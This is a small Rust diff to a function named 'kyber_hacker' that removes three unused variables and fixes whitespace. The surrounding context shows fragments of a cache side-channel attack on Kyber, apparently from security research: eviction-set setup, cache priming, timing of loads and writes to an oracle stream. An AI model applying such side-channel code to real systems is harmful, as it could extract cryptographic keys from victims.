@@ -474,10 +474,7 @@ fn kyber_hacker(
     oracle_stream.write_all(&rand_mask.to_le_bytes()).unwrap();
     oracle_stream.write_all(&target_addr.to_le_bytes()).unwrap();
 
-    let mut bad_flag = 0;
     group_search_flag = 1;
-    let mut global_guess_result = 100;
-    let mut repetition_times = 0;
 
     evset_vec_set_offset(&victim_array_cache_lines, L2_CACHE_WAYS, 
         (victim_buf_offset as usize) & 0x3f80, 
@@ -505,7 +502,7 @@ fn kyber_hacker(
             };
 
             __trash = unsafe{c_sleep(1500000, __trash)};
-    
+
             compiler_fence(Ordering::SeqCst);
 
             __trash = prime_with_dependencies(&pp_evset, __trash);
@@ -531,7 +528,7 @@ fn kyber_hacker(
 
             // store result
             times_to_load_test_ptr_atk.push(test_time);
-    
+
             // Dumpy iteration to clean
             msg_data[0] = !(__trash & MSB_MASK) as u8;
             stream.write_all(&msg_data).unwrap();
